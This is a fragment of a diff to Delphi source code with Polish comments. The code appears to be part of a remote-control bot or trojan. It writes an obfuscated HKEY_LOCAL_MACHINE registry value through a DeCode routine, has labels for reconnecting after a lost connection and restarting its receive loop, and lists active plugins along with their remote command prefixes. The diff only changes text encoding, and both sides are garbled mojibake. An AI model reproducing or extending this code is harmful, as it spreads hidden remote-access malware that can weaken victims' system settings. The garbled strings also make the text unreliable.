- if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('∆Ã∆«∏¿œœ∂ËÂÂÿ·Á∂‚·ÁÂ‚ﬂ∆ÿÁœœ∆ÿÂÈ‹÷ÿÊœœ∆€‘Âÿ◊¥÷÷ÿÊÊœœ√‘Â‘‡ÿÁÿÂÊœœπ‹ÂÿÍ‘ﬂﬂ√‚ﬂ‹÷Ïœœ∆Á‘·◊‘Â◊√Â‚Ÿ‹ﬂÿ')),0,KEY_SET_VALUE,H) = ERROR_SUCCESS then begin
+ if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('ƒÜƒöƒÜ√á¬∏≈îƒéƒé¬∂ƒçƒ∫ƒ∫≈ò√°√ß¬∂√¢√°√ßƒ∫√¢√üƒÜ≈ò√ßƒéƒéƒÜ≈òƒ∫√©√ú√ñ≈òƒáƒéƒéƒÜ≈∞√îƒ∫≈ò√ó¬¥√ñ√ñ≈òƒáƒáƒéƒéƒÇ√îƒ∫√î≈ï≈ò√ß≈òƒ∫ƒáƒéƒéƒÖ√úƒ∫≈òƒô√î√ü√üƒÇ√¢√ü√ú√ñƒõƒéƒéƒÜ√ß√î√°√ó√îƒ∫√óƒÇƒ∫√¢≈Æ√ú√ü≈ò')),0,KEY_SET_VALUE,H) = ERROR_SUCCESS then begin
   try
-   RegSetValueEx(H, PChar(DeCode('∏·‘’ﬂÿπ‹ÂÿÍ‘ﬂﬂ')), 0, REG_DWORD, @Enable, SizeOf(Enable));
+   RegSetValueEx(H, PChar(DeCode('¬∏√°√î≈ê√ü≈òƒÖ√úƒ∫≈òƒô√î√ü√ü')), 0, REG_DWORD, @Enable, SizeOf(Enable));
   finally
    RegCloseKey(H);
   end;
@@ -833,8 +833,8 @@ begin
  Result:=Copy(Result,1,Pos(#0,Result)-1);
 end;
 
-label ConnectionLost,                { Skok do re-po≥πczenia                  }
-      GoBack,                        { Skok na poczπtek pÍtli odbioru         }
+label ConnectionLost,                { Skok do re-po≈ÇƒÖczenia                  }
+      GoBack,                        { Skok na poczƒÖtek pƒôtli odbioru         }
       Retry;                         { Skok na "re-uruchomienie"              }
 
 var I,A:Integer;
@@ -995,7 +995,7 @@ begin
             end;
             if(Copy(NullString,1,Length(C_LIST_PLUG))=C_LIST_PLUG)then begin
              if(PlugHigh>0)then begin
-              NullString:='Lista aktywnych pluginÛw:'+#13+#13#10;
+              NullString:='Lista aktywnych plugin√≥w:'+#13+#13#10;
               for X := 0 to PlugHigh-1 do begin
                NullString:=NullString+'Nazwa: '+PluginList[X].Info._Name+#13+'Wersja: '+CurrToStr(PluginList[X].Info._Version)+#13+
                                       'Komenda: '+Prefix+PluginList[X].Info._Command+#13+'ID: '+IntToStr(X)+#13#10+#13;
